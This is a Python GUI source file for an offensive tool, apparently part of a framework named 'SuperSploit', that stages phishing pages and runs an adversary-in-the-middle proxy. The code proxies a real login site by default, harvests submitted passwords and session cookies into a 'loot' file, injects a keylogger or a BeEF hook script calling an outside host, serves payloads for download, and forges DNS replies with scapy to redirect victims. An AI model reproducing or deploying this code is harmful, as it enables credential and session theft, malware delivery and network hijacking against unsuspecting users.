import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog, simpledialog
import os
import re
import threading
import http.server
import socketserver
import time
import subprocess
from pathlib import Path
import urllib.parse
import getpass
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

import sys
framework_root = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", ".."))
if framework_root not in sys.path:
    sys.path.append(framework_root)

try:
    from scapy.all import sniff, send, IP, UDP, DNS, DNSQR, DNSRR
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

# Placeholder for framework database integration
try:
    from source.core.database import DatabaseManagment
    from source.core.license_manager import LicenseManager
    framework_db = DatabaseManagment.get()
except ImportError:
    
    try:
        from source.core.database import DatabaseManagment
        from source.core.license_manager import LicenseManager
        framework_db = DatabaseManagment.get()
    except ImportError:
        framework_db = {}
        class LicenseManager:
            @staticmethod
            def gate_access(f): 
                print(f"\n[!] ACCESS DENIED: '{f}' is a SuperSploit Pro feature.")
                print("[*] Standalone license validation failed. Please run via the main CLI.")
                return False

class WebTemplateGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("SuperSploit Web Stager & AitM Harvester")
        self.root.geometry("1000x950")

        # Sentry/Modern Dark Color Palette
        self.bg_main = "#181825"
        self.bg_sec = "#1e1e2e"
        self.accent = "#6c5fc7"
        self.accent_hover = "#8a7edb"
        self.fg_main = "#ffffff"
        self.term_bg = "#0d0d14"
        self.term_fg = "#00ffcc"
        
        self.root.configure(bg=self.bg_main)
        self.style = ttk.Style()

        self.style.theme_use('clam')

        # Global ttk Style Overhauls
        self.style.configure(".", background=self.bg_main, foreground=self.fg_main, font=("Helvetica", 10))
        self.style.configure("TFrame", background=self.bg_main)
        self.style.configure("TLabelframe", background=self.bg_sec, borderwidth=1, bordercolor=self.bg_main)
        self.style.configure("TLabelframe.Label", background=self.bg_sec, foreground=self.accent, font=("Helvetica", 11, "bold"))
        self.style.configure("TLabel", background=self.bg_sec, foreground=self.fg_main)
        self.style.configure("TRadiobutton", background=self.bg_sec, foreground=self.fg_main)
        self.style.configure("TCheckbutton", background=self.bg_sec, foreground=self.fg_main)
        self.style.configure("TPanedwindow", background=self.bg_main)
        
        # Button Styling
        self.style.configure("TButton", background=self.accent, foreground="#ffffff", font=("Helvetica", 10, "bold"), borderwidth=0, padding=6)
        self.style.map("TButton", background=
[("active", self.accent_hover)])
        
        # Entry & Combobox Styling
        self.style.configure("TEntry", fieldbackground="#313244", foreground="#ffffff", borderwidth=0, insertcolor="#ffffff")
        self.style.configure("TCombobox", fieldbackground="#313244", foreground="#ffffff", background=self.bg_sec, borderwidth=0, arrowcolor=self.fg_main)
        self.style.map("TCombobox", fieldbackground=[("readonly", "#313244")], selectbackground=[("readonly", self.accent)], selectforeground=[("readonly", "#ffffff")])
        
        # Notebook (Tabs) Styling
        self.style.configure("TNotebook", background=self.bg_main, borderwidth=0)
        self.style.configure("TNotebook.Tab", background=self.bg_sec, foreground=self.fg_main, padding=(15, 6), font=("Helvetica", 10, "bold"), borderwidth=0)
        self.style.map("TNotebook.Tab", background=[("selected", self.accent)], foreground=[("selected", "#ffffff")])

        # Treeview (Tables) Styling
        self.style.configure("Treeview", background=self.bg_main, foreground=self.fg_main, fieldbackground=self.bg_main, borderwidth=0, rowheight=28)
        self.style.configure("Treeview.Heading", background=self.bg_sec, foreground=self.accent, font=("Helvetica", 10, "bold"), borderwidth=0)
        self.style.map("Treeview", background=[('selected', self.accent)], foreground=[('selected', '#ffffff')])

        self.template_dir = os.path.join(os.getenv("HOME"), ".SuperSploit", "templates", "web")
        self.loot_file = os.path.join(os.getenv("HOME"), ".SuperSploit", ".data", ".loot", "captured_creds.txt")
        self._ensure_loot_dir()
        
        self.active_template_path = ""
        self.placeholders = {}
        self.server_thread = None
        self.httpd = None
        self.cert_path = tk.StringVar()

        self.is_dns_running = False
        self.patch_rules = {}

        self._build_ui()
        self._refresh_templates()
        self._refresh_loot()
        self._refresh_payloads()

    def _ensure_loot_dir(self):
        loot_dir = os.path.dirname(self.loot_file)
        if not os.path.exists(loot_dir):
            os.makedirs(loot_dir)

    def _build_ui(self):
        main_frame = ttk.Frame(self.root, padding="15")
        main_frame.pack(fill=tk.BOTH, expand=True)

        self.main_tabs = ttk.Notebook(main_frame)
        self.main_tabs.pack(fill=tk.BOTH, expand=True)

        # --- TAB 1: STAGING & CONFIG ---
        self.tab_staging = ttk.Frame(self.main_tabs, padding="10")
        self.main_tabs.add(self.tab_staging, text=" 🏗️ Staging & Server ")

        # Mode Selection
        mode_frame = ttk.LabelFrame(self.tab_staging, text=" ⚙️ Operation Mode ", padding="15")
        mode_frame.pack(fill=tk.X, pady=5)
        self.op_mode = tk.StringVar(value="Static")
        ttk.Radiobutton(mode_frame, text="Static Template", variable=self.op_mode, value="Static", command=self._on_mode_change).pack(side=tk.LEFT, padx=10)
        ttk.Radiobutton(mode_frame, text="AitM Proxy (Live Intercept)", variable=self.op_mode, value="AitM", command=self._on_mode_change).pack(side=tk.LEFT, padx=10)


        # Template Selection (Static Mode)
        self.static_frame = ttk.LabelFrame(self.tab_staging, text=" 📂 Template Selection ", padding="15")
        self.static_frame.pack(fill=tk.X, pady=5)
        ttk.Label(self.static_frame, text="Select Template:").pack(side=tk.LEFT, padx=5)
        self.template_var = tk.StringVar()
        self.template_combo = ttk.Combobox(self.static_frame, textvariable=self.template_var, width=40, state="readonly")
        self.template_combo.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        self.template_combo.bind("<<ComboboxSelected>>", self._on_template_selected)
        ttk.Button(self.static_frame, text="🔄 Refresh", command=self._refresh_templates).pack(side=tk.LEFT, padx=5)

        # Target URL (AitM Mode)
        self.aitm_frame = ttk.Frame(self.tab_staging)
        self.aitm_label_frame = ttk.LabelFrame(self.aitm_frame, text=" 🎯 Proxy Target (AitM) ", padding="15")
        self.aitm_label_frame.pack(fill=tk.X, pady=5)
        self.target_url = tk.StringVar(value="https://login.microsoftonline.com")
        ttk.Label(self.aitm_label_frame, text="Target URL:").pack(side=tk.LEFT, padx=5)
        ttk.Entry(self.aitm_label_frame, textvariable=self.target_url, width=50).pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        self.js_inject = tk.StringVar()
        ttk.Label(self.aitm_label_frame, text="Inject HTML/JS:").pack(side=tk.LEFT, padx=5)
        self.js_combo = ttk.Combobox(self.aitm_label_frame, textvariable=self.js_inject, width=40)
        self.js_combo['values'] = [
            "",
            "<script src='http://127.0.0.1:3000/hook.js'></script> <!-- BeEF Hook -->",
            "<script>document.addEventListener('keypress', c => fetch('/log?k='+c.key));</script> <!-- Keylogger -->",
            "<script>alert('SuperSploit AitM Payload Active!');</script>"
        ]
        self.js_combo.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)

        # Payload Hosting (Pinned to Bottom)
        payload_frame = ttk.LabelFrame(self.tab_staging, text=" 📦 Framework Payload Hosting ", padding="15")
        payload_frame.pack(side=tk.BOTTOM, fill=tk.X, pady=5)
        
        self.host_payload_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(payload_frame, text="Serve payload at /download", variable=self.host_payload_var).pack(side=tk.LEFT, padx=5)
        ttk.Label(payload_frame, text="Select Payload:").pack(side=tk.LEFT, padx=10)
        self.payload_var = tk.StringVar()
        self.payload_combo = ttk.Combobox(payload_frame, textvariable=self.payload_var, width=40, state="readonly")
        self.payload_combo.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        ttk.Button(payload_frame, text="🔄 Refresh", command=self._refresh_payloads).pack(side=tk.LEFT, padx=5)

        # Server Control (Pinned to Bottom)
        server_frame = ttk.LabelFrame(self.tab_staging, text=" 🌐 Server Control ", padding="15")
        server_frame.pack(side=tk.BOTTOM, fill=tk.X, pady=5)
        ttk.Label(server_frame, text="Host:").grid(row=0, column=0, padx=5)
        self.host_entry = ttk.Entry(server_frame, width=15); self.host_entry.insert(0, "0.0.0.0"); self.host_entry.grid(row=0, column=1)
        ttk.Label(server_frame, text="Port:").grid(row=0, column=2, padx=5)
        self.port_entry = ttk.Entry(server_frame, width=8); self.port_entry.insert(0, "80"); self.port_entry.grid(row=0, column=3)
        self.use_https = tk.BooleanVar(value=False)
        ttk.Checkbutton(server_frame, text="HTTPS", variable=self.use_https).grid(row=0, column=4, padx=5)
        self.status_label = ttk.Label(server_frame, text="Offline", foreground="#ff5555", font=("Helvetica", 10, "bold")); self.status_label.grid(row=0, column=5, padx=10)

        ttk.Label(server_frame, text="Custom Cert (Optional):").grid(row=1, column=0, columnspan=2, padx=5, pady=5, sticky=tk.W)
        ttk.Entry(server_frame, textvariable=self.cert_path, width=35).grid(row=1, column=2, columnspan=3, sticky=tk.W, pady=5)
        ttk.Button(server_frame, text="Browse", command=self._browse_cert).grid(row=1, column=5, padx=5, pady=5)
        
        self.start_btn = ttk.Button(server_frame, text="🚀 START SERVER", command=self._toggle_server)
        self.start_btn.grid(row=2, column=0, columnspan=6, sticky=tk.EW, pady=(10, 0))

        # Variables & Preview (Expands in the middle)
        paned = ttk.PanedWindow(self.tab_staging, orient=tk.HORIZONTAL)
        paned.pack(side=tk.TOP, fill=tk.BOTH, expand=True, pady=10)

        self.var_container = ttk.LabelFrame(paned, text=" ✍️ Variable Injection ", padding="10")
        paned.add(self.var_container, weight=1)
        
        # Attach Scrollbar to Canvas
        scrollbar = ttk.Scrollbar(self.var_container, orient=tk.VERTICAL)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.var_canvas = tk.Canvas(self.var_container, yscrollcommand=scrollbar.set, bg=self.bg_sec, highlightthickness=0)
        self.var_canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.config(command=self.var_canvas.yview)
        
        self.scroll_frame = ttk.Frame(self.var_canvas)
        self.scroll_window = self.var_canvas.create_window((0, 0), window=self.scroll_frame, anchor="nw")
        
        self.scroll_frame.bind("<Configure>", lambda e: self.var_canvas.configure(scrollregion=self.var_canvas.bbox("all")))
        self.var_canvas.bind("<Configure>", lambda e: self.var_canvas.itemconfig(self.scroll_window, width=e.width))

        preview_frame = ttk.LabelFrame(paned, text=" 👁️ Source Preview ", padding="10")
        paned.add(preview_frame, weight=2)
        self.preview_text = scrolledtext.ScrolledText(preview_frame, font=("Consolas", 11), bg=self.term_bg, fg="#ffffff", relief=tk.FLAT, padx=10, pady=10, insertbackground="#ffffff")
        self.preview_text.pack(fill=tk.BOTH, expand=True)

        # --- TAB 2: CAPTURED LOOT ---
        self.tab_loot = ttk.Frame(self.main_tabs, padding="10")
        self.main_tabs.add(self.tab_loot, text=" 📥 Captured Loot ")

        loot_header = ttk.Frame(self.tab_loot)
        loot_header.pack(fill=tk.X, pady=5)
        ttk.Label(loot_header, text="Real-time Credential/Session Harvesting:").pack(side=tk.LEFT)
        ttk.Button(loot_header, text="🔄 Refresh Loot", command=self._refresh_loot).pack(side=tk.RIGHT, padx=5)
        ttk.Button(loot_header, text="🧹 Clear Loot File", command=self._clear_loot).pack(side=tk.RIGHT)

        self.loot_display = scrolledtext.ScrolledText(self.tab_loot, bg=self.term_bg, fg=self.term_fg, font=("Consolas", 11), relief=tk.FLAT, padx=10, pady=10)
        self.loot_display.pack(fill=tk.BOTH, expand=True)

        # --- TAB 3: DNS PATCHER ---
        self.tab_dns = tk.Frame(self.main_tabs, bg=self.bg_main)
        self.main_tabs.add(self.tab_dns, text=" 🎯 Active DNS Patcher ")
        self._build_dns_tab()

    def _build_dns_tab(self):
        # --- Interface & Controls ---
        top_frame = ttk.LabelFrame(self.tab_dns, text=" ⚙️ Spoofer Configuration ", padding="15")
        top_frame.pack(fill=tk.X, padx=10, pady=(10, 10))

        ttk.Label(top_frame, text="Network Interface:").grid(row=0, column=0, sticky=tk.W, padx=10, pady=5)
        
        try:
            import socket
            available_ifaces = ["any"] + [i[1] for i in socket.if_nameindex()]
        except Exception:
            try:
                available_ifaces = ["any"] + os.listdir('/sys/class/net/')
            except Exception:
                available_ifaces = ["any", "eth0", "wlan0", "lo"]
                
        self.iface_entry = ttk.Combobox(top_frame, values=available_ifaces, width=18, font=("Helvetica", 11))
        if "wlan0" in available_ifaces:
            self.iface_entry.set("wlan0")
        elif "eth0" in available_ifaces:
            self.iface_entry.set("eth0")
        else:
            self.iface_entry.set(available_ifaces[1] if len(available_ifaces) > 1 else "any")
        self.iface_entry.grid(row=0, column=1, padx=10, pady=5, sticky=tk.W)

        # --- Rule Manager ---
        rule_frame = ttk.LabelFrame(self.tab_dns, text=" 🎯 Active DNS Patches ", padding="15")
        rule_frame.pack(fill=tk.X, padx=10, pady=(0, 10))

        input_frame = ttk.Frame(rule_frame)
        input_frame.pack(fill=tk.X, pady=(0, 10))

        ttk.Label(input_frame, text="Target Domain (Use * for all):").pack(side=tk.LEFT, padx=(0, 5))
        self.domain_entry = ttk.Entry(input_frame, width=25, font=("Helvetica", 11))
        self.domain_entry.insert(0, "example.com")
        self.domain_entry.pack(side=tk.LEFT, padx=5)

        ttk.Label(input_frame, text="Spoofed IP:").pack(side=tk.LEFT, padx=10)
        self.ip_entry = ttk.Entry(input_frame, width=20, font=("Helvetica", 11))
        self.ip_entry.insert(0, "127.0.0.1")
        self.ip_entry.pack(side=tk.LEFT, padx=5)

        ttk.Button(input_frame, text="➕ ADD PATCH", command=self._add_rule).pack(side=tk.LEFT, padx=10)
        ttk.Button(input_frame, text="➖ REMOVE", command=self._remove_rule).pack(side=tk.LEFT)

        cols = ("Domain", "Spoofed IP")
        self.rule_tree = ttk.Treeview(rule_frame, columns=cols, show="headings", selectmode="browse", height=5)
        self.rule_tree.tag_configure('oddrow', background=self.bg_main)
        self.rule_tree.tag_configure('evenrow', background=self.bg_sec)
        
        for c in cols:
            self.rule_tree.heading(c, text=c)
            self.rule_tree.column(c, anchor=tk.W)
        
        self.rule_tree.pack(fill=tk.X, expand=True)

        # --- Action Banners ---
        btn_frame = ttk.Frame(self.tab_dns)
        btn_frame.pack(fill=tk.X, padx=10, pady=(0, 10))

        self.dns_start_btn = ttk.Button(btn_frame, text="🚀 START DNS PATCHER", command=self._start_patcher)
        self.dns_start_btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5), ipady=3)

        self.dns_stop_btn = ttk.Button(btn_frame, text="🛑 STOP DNS PATCHER", command=self._stop_patcher, state=tk.DISABLED)
        self.dns_stop_btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5, 0), ipady=3)

        # --- Console ---
        log_frame = ttk.LabelFrame(self.tab_dns, text=" 📜 Live Intercept Console ", padding="5")
        log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 10))
        
        self.dns_console = scrolledtext.ScrolledText(log_frame, bg=self.term_bg, fg=self.term_fg, font=("Consolas", 11), relief=tk.FLAT, padx=10, pady=10)
        self.dns_console.pack(fill=tk.BOTH, expand=True)

        if not HAS_SCAPY:
            self._log_dns("[-] SCAPY MISSING. Please run: pip install scapy")
            self.dns_start_btn.config(state=tk.DISABLED)

    def _log_dns(self, msg):
        timestamp = time.strftime("[%H:%M:%S]")
        def _update():
            self.dns_console.config(state=tk.NORMAL)
            self.dns_console.insert(tk.END, f"{timestamp} {msg}\n")
            self.dns_console.see(tk.END)
            self.dns_console.config(state=tk.DISABLED)
        self.root.after(0, _update)

    def _refresh_tree(self):
        for item in self.rule_tree.get_children():
            self.rule_tree.delete(item)
        for i, (dom, ip) in enumerate(self.patch_rules.items()):
            tag = 'evenrow' if i % 2 == 0 else 'oddrow'
            self.rule_tree.insert("", tk.END, values=(dom, ip), tags=(tag,))

    def _add_rule(self):
        dom = self.domain_entry.get().strip().lower()
        ip = self.ip_entry.get().strip()
        if dom and ip:
            if ":" in ip:
                messagebox.showerror("Invalid Format", "DNS records strictly resolve to IP addresses, not ports.\n\nPlease enter a standard IPv4 address (e.g., 192.168.1.100).\n\nNote: To catch standard web traffic, ensure your Web Stager is bound to Port 80 (HTTP) or 443 (HTTPS).")
                return
                
            self.patch_rules[dom] = ip
            self._refresh_tree()
            self._log_dns(f"[*] DNS Patch Added: {dom} -> {ip}")

    def _remove_rule(self):
        selected = self.rule_tree.selection()
        if selected:
            item = self.rule_tree.item(selected[0])
            dom = item['values'][0]
            if dom in self.patch_rules:
                del self.patch_rules[dom]
                self._refresh_tree()
                self._log_dns(f"[*] DNS Patch Removed: {dom}")

    def _process_packet(self, packet):
        if not self.is_dns_running:
            return
        
        # Must have IP and UDP layers (Filters out IPv6 traffic for now)
        if not packet.haslayer(IP) or not packet.haslayer(UDP):
            return

        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
            dns_qr = packet.getlayer(DNSQR)
            if not dns_qr or dns_qr.qtype != 1:  # Only spoof 'A' (IPv4) records! Prevents OS rejection of AAAA packets.
                return
            
            # Lowercase the domain to ensure it matches the patch_rules dictionary keys
            queried_domain = dns_qr.qname.decode('utf-8', errors='ignore').strip('.').lower()
            spoofed_ip = None
            if queried_domain in self.patch_rules:
                spoofed_ip = self.patch_rules[queried_domain]
            elif "*" in self.patch_rules:
                spoofed_ip = self.patch_rules["*"]

            if spoofed_ip:
                try:
                    ip_layer = IP(dst=packet[IP].src, src=packet[IP].dst)
                    udp_layer = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
                    ans = DNSRR(rrname=packet[DNSQR].qname, ttl=60, rdata=spoofed_ip)
                    # Mirror the 'rd' (recursion desired) flag so clients don't drop the forged response
                    dns_layer = DNS(id=packet[DNS].id, qr=1, aa=1, rd=packet[DNS].rd, qd=packet[DNS].qd, an=ans)
                    forged_pkt = ip_layer / udp_layer / dns_layer
                    
                    iface_name = self.iface_entry.get().strip()
                    local_ip = None
                    try:
                        from scapy.all import get_if_addr
                        if iface_name.lower() != "any":
                            local_ip = get_if_addr(iface_name)
                    except Exception:
                        pass
                        
                    # Dynamic Routing: Protects the AP from IP spoofing crashes during local tests,
                    # but ensures external targets (phones, other PCs) receive the forged packet.
                    if packet[IP].src == "127.0.0.1" or packet[IP].src == local_ip:
                        send(forged_pkt, verbose=0)
                    else:
                        if iface_name.lower() == "any":
                            send(forged_pkt, verbose=0)
                        else:
                            send(forged_pkt, verbose=0, iface=iface_name)

                    self._log_dns(f"[+] FORGED: {queried_domain} -> {spoofed_ip} (To: {packet[IP].src})")
                except Exception as e:
                    self._log_dns(f"[-] Packet Forge Error: {e}")

    def _sniff_thread(self):
        iface = self.iface_entry.get().strip()
        self._log_dns(f"\n[*] Starting DNS Patcher Engine on interface: {iface}")
        self._log_dns(f"[*] Intercepting UDP Port 53...")
        try:
            sniff_iface = iface if iface.lower() != "any" else None
            # promisc=False is critical for Wi-Fi interfaces (wlan0/wlp3s0). 
            # Scapy defaults to promisc=True, which crashes many managed-mode wireless drivers.
            sniff(filter="udp port 53", iface=sniff_iface, prn=self._process_packet, store=0, stop_filter=lambda x: not self.is_dns_running, promisc=False)
            self._log_dns("[*] DNS Patcher Engine gracefully stopped.")
        except Exception as e:
            self._log_dns(f"[-] Sniffer crashed (Run as Root?): {e}")
            self.root.after(0, self._stop_patcher)

    def _start_patcher(self):
        if not self.patch_rules:
            messagebox.showwarning("Warning", "Add at least one DNS patch rule first.")
            return
        self.is_dns_running = True
        self.dns_start_btn.config(state=tk.DISABLED)
        self.dns_stop_btn.config(state=tk.NORMAL)
        threading.Thread(target=self._sniff_thread, daemon=True).start()

    def _stop_patcher(self):
        self.is_dns_running = False
        self._log_dns("[*] Halting DNS Patcher...")
        self.dns_start_btn.config(state=tk.NORMAL)
        self.dns_stop_btn.config(state=tk.DISABLED)

    def _browse_cert(self):
        f = filedialog.askopenfilename(filetypes=[("PEM/CRT Files", "*.pem *.crt"), ("All Files", "*.*")])
        if f: self.cert_path.set(f)

    def _on_mode_change(self):
        if self.op_mode.get() == "Static":
            self.aitm_frame.pack_forget()
            self.static_frame.pack(before=self.var_container.master, fill=tk.X, pady=5)
            self.preview_text.config(state=tk.NORMAL)
            self.preview_text.delete(1.0, tk.END)
            self.preview_text.insert(tk.END, "[*] Select a template to preview...")
        else:
            self.static_frame.pack_forget()
            self.aitm_frame.pack(before=self.var_container.master, fill=tk.X, pady=5)
            self.preview_text.delete(1.0, tk.END)
            self.preview_text.insert(tk.END, f"[*] AitM Mode Active.\n[*] Traffic will be proxied to: {self.target_url.get()}\n[*] POST data and cookies will be intercepted.")

    def _refresh_templates(self):
        if not os.path.exists(self.template_dir):
            os.makedirs(self.template_dir)
        templates = [f for f in os.listdir(self.template_dir) if f.endswith(".html")]
        self.template_combo['values'] = templates
        if templates:
            self.template_combo.current(0)
            self._on_template_selected(None)

    def _refresh_payloads(self):
        try:
            payloads_dir = os.path.join(framework_root, "payloads")
            os.makedirs(payloads_dir, exist_ok=True)
            payload_files = []
            for root_dir, _, files in os.walk(payloads_dir):
                for f in files:
                    payload_files.append(os.path.relpath(os.path.join(root_dir, f), payloads_dir))
            self.payload_combo['values'] = payload_files
            if payload_files: self.payload_combo.current(0)
        except Exception as e:
            print(f"[-] Failed to load payloads: {e}")

    def _on_template_selected(self, event):
        template_name = self.template_var.get()
        self.active_template_path = os.path.join(self.template_dir, template_name)
        with open(self.active_template_path, 'r') as f: content = f.read()
        self.preview_text.delete(1.0, tk.END); self.preview_text.insert(tk.END, content)
        found = re.findall(r'{{(.*?)}}', content)
        unique_placeholders = sorted(list(set(found)))
        for widget in self.scroll_frame.winfo_children(): widget.destroy()
        self.placeholders = {}
        for i, ph in enumerate(unique_placeholders):
            ttk.Label(self.scroll_frame, text=f"{ph}:").grid(row=i, column=0, sticky=tk.W, pady=2)
            entry = ttk.Entry(self.scroll_frame, width=30)
            val = framework_db.get(ph, "")
            if not val and ph == "LHOST": val = "127.0.0.1"
            if not val and ph == "LPORT": val = "5000"
            entry.insert(0, val); entry.grid(row=i, column=1, padx=10, pady=2)
            self.placeholders[ph] = entry

    def _generate_rendered_content(self):
        if not self.active_template_path: return ""
        with open(self.active_template_path, 'r') as f: content = f.read()
        for ph, entry in self.placeholders.items():
            content = content.replace(f"{{{{{ph}}}}}", entry.get())
        return content

    def _refresh_loot(self):
        self.loot_display.delete(1.0, tk.END)
        if os.path.exists(self.loot_file):
            with open(self.loot_file, "r") as f: self.loot_display.insert(tk.END, f.read())
        self.loot_display.see(tk.END)

    def _clear_loot(self):
        if messagebox.askyesno("Confirm", "Wipe captured credentials?"):
            with open(self.loot_file, "w") as f: f.write("")
            self._refresh_loot()

    def _log_loot(self, client_addr, data):
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        entry = f"[{timestamp}] IP: {client_addr}\n"
        for k, v in data.items(): entry += f"  {k:<15}: {v}\n"
        entry += "-"*40 + "\n"
        with open(self.loot_file, "a") as f: f.write(entry)
        self.root.after(0, self._refresh_loot)

    def _toggle_server(self):
        if self.server_thread and self.server_thread.is_alive():
            if self.httpd: self.httpd.shutdown(); self.httpd.server_close()
            self.status_label.config(text="Offline", foreground="#ff5555"); self.start_btn.config(text="🚀 START SERVER")
        else:
            self._start_server()

    def _start_server(self):
        import requests
        host = self.host_entry.get(); port = int(self.port_entry.get())
        mode = self.op_mode.get(); target = self.target_url.get().rstrip('/')
        
        # PRO GATE: Check license for AitM mode
        if mode == "AitM":
            if not LicenseManager.gate_access("AitM Proxy"):
                return

        staged_html = os.path.join(os.getenv("HOME"), ".SuperSploit", ".data", "staged_web.html")
        if mode == "Static":
            with open(staged_html, "w") as f: f.write(self._generate_rendered_content())

        outer_self = self
        class StagedHandler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                # Custom Keylogger Endpoint
                if self.path.startswith("/log?k="):
                    key = urllib.parse.unquote(self.path.split("?k=")[1])
                    outer_self._log_loot(self.client_address[0], {"⌨️ KEYSTROKE": key})
                    self.send_response(200); self.end_headers()
                    return

                # Payload Drop Endpoint
                if outer_self.host_payload_var.get() and self.path.split("?")[0] == "/download":
                    payload_rel = outer_self.payload_var.get()
                    if payload_rel:
                        payload_path = os.path.join(framework_root, "payloads", payload_rel)
                        if os.path.exists(payload_path):
                            self.send_response(200)
                            self.send_header("Content-Disposition", f"attachment; filename={os.path.basename(payload_path)}")
                            self.send_header("Content-Length", str(os.path.getsize(payload_path)))
                            self.send_header("Content-Type", "application/octet-stream")
                            self.end_headers()
                            with open(payload_path, 'rb') as f: self.wfile.write(f.read())
                            outer_self._log_loot(self.client_address[0], {"🎯 PAYLOAD DROPPED": payload_rel})
                            return
                        else:
                            self.send_error(404, "SuperSploit: Payload file not found on disk.")
                            return

                if mode == "Static":
                    self.send_response(200); self.send_header("Content-type", "text/html"); self.end_headers()
                    with open(staged_html, 'rb') as f: self.wfile.write(f.read())
                else:
                    try:
                        # Forward client headers to maintain session state/cookies
                        req_headers = {k: v for k, v in self.headers.items() if k.lower() not in ['host']}
                        print(f"\n[*] [AitM Debug] Intercepted GET: {self.path}")
                        print(f"[*] [AitM Debug] Upstream Target: {target}{self.path}")
                        resp = requests.get(f"{target}{self.path}", headers=req_headers, verify=False, allow_redirects=False)
                        print(f"[*] [AitM Debug] Upstream Response: {resp.status_code}")
                        self.send_response(resp.status_code)
                        for k, v in resp.headers.items():
                            if k.lower() not in ['content-encoding', 'transfer-encoding', 'content-length', 'set-cookie']:
                                self.send_header(k, v)
                        if 'Set-Cookie' in resp.headers:
                            outer_self._log_loot(self.client_address[0], {"CAPTURED_COOKIES": resp.headers['Set-Cookie']})
                        self.end_headers()
                        content = resp.content.decode('utf-8', errors='ignore')
                        content = content.replace(target, f"http://{self.headers['Host']}")
                        js_payload = outer_self.js_inject.get().split(" <!--")[0]  # Strip comments
                        if js_payload and "</body>" in content.lower():
                            content = re.sub(r'</body>', f'{js_payload}</body>', content, flags=re.IGNORECASE)
                        self.wfile.write(content.encode())
                    except Exception as e: 
                        print(f"[-] [AitM Debug] Upstream GET Error: {e}")
                        self.send_error(500, str(e))
            
            def do_POST(self):
                content_length = int(self.headers.get('Content-Length', 0))
                raw_post_data = self.rfile.read(content_length)
                post_data = raw_post_data.decode('utf-8', errors='ignore')
                parsed_data = urllib.parse.parse_qs(post_data)
                cleaned_data = {k: v[0] for k, v in parsed_data.items()}
                
                if mode == "AitM":
                    loot = {}
                    for k, v in cleaned_data.items():
                        if any(x in k.lower() for x in ['user', 'pass', 'email', 'login', 'id']):
                            loot[f"🔥 {k}"] = v
                        else:
                            loot[k] = v
                    outer_self._log_loot(self.client_address[0], loot)
                else:
                    outer_self._log_loot(self.client_address[0], cleaned_data)
                
                if mode == "Static":
                    self.send_response(200); self.send_header("Content-type", "text/html"); self.end_headers()
                    self.wfile.write(b"<html><body><h1>Processing Security Request...</h1><p>Identity verified. You will be redirected shortly.</p></body></html>")
                else:
                    try:
                        # Pass headers and RAW bytes to prevent JSON/Multipart mangling
                        req_headers = {k: v for k, v in self.headers.items() if k.lower() not in ['host', 'content-length']}
                        print(f"\n[*] [AitM Debug] Intercepted POST: {self.path}")
                        print(f"[*] [AitM Debug] Upstream Target: {target}{self.path}")
                        resp = requests.post(f"{target}{self.path}", data=raw_post_data, headers=req_headers, verify=False, allow_redirects=False)
                        print(f"[*] [AitM Debug] Upstream Response: {resp.status_code}")
                        
                        self.send_response(resp.status_code)
                        for k, v in resp.headers.items():
                            if k.lower() not in ['content-encoding', 'transfer-encoding', 'content-length']: self.send_header(k, v)
                        self.end_headers(); self.wfile.write(resp.content)
                    except Exception as e: 
                        print(f"[-] [AitM Debug] Upstream POST Error: {e}")
                        self.send_error(500, str(e))
            
            def log_message(self, format, *args): 
                print(f"[*] [HTTP Server] {self.client_address[0]} - {format % args}")

        try:
            self.httpd = socketserver.TCPServer((host, port), StagedHandler)
            if self.use_https.get():
                import ssl
                custom_cert = self.cert_path.get().strip()
                if custom_cert and os.path.exists(custom_cert):
                    cert_path = custom_cert
                else:
                    cert_path = os.path.join(os.getenv("HOME"), ".SuperSploit", ".data", "server.pem")
                    if not os.path.exists(cert_path):
                        os.system(f'openssl req -new -x509 -keyout {cert_path} -out {cert_path} -days 365 -nodes -subj "/C=US/ST=NY/L=NY/O=SuperSploit/CN={host}" 2>/dev/null')
                
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                context.load_cert_chain(certfile=cert_path)
                self.httpd.socket = context.wrap_socket(self.httpd.socket, server_side=True)
                
            self.server_thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
            self.server_thread.start()
            self.status_label.config(text="Online", foreground="#50fa7b"); self.start_btn.config(text="🛑 STOP SERVER")
            messagebox.showinfo("Success", f"Server active at http://{host}:{port}/")
        except Exception as e: messagebox.showerror("Error", str(e))

if __name__ == "__main__":
    # Sudo Escalation Verification
    if hasattr(os, 'geteuid') and os.geteuid() != 0:
        print("\n[*] SuperSploit Web Stager requires root privileges to bind low-level ports (53, 80, 443).")
        password = getpass.getpass("[sudo] Enter password: ")
        
        if password:
            env_args = []
            if 'DISPLAY' in os.environ:
                env_args.append(f"DISPLAY={os.environ['DISPLAY']}")
            if 'XAUTHORITY' in os.environ:
                env_args.append(f"XAUTHORITY={os.environ['XAUTHORITY']}")
            
            # Pass -p '' to prevent sudo from printing its own prompt to stderr
            cmd_run = ['sudo', '-S', '-p', '', '-E', 'env'] + env_args + [sys.executable] + sys.argv
            try:
                p = subprocess.Popen(cmd_run, stdin=subprocess.PIPE, universal_newlines=True)
                p.communicate(password + '\n')
                sys.exit(p.returncode)
            except Exception as e:
                print(f"[-] Failed to escalate privileges: {e}")
                sys.exit(1)
        else:
            print("[-] Sudo escalation cancelled. Exiting.")
            sys.exit(0)

    root = tk.Tk()
    app = WebTemplateGUI(root)
    root.mainloop()
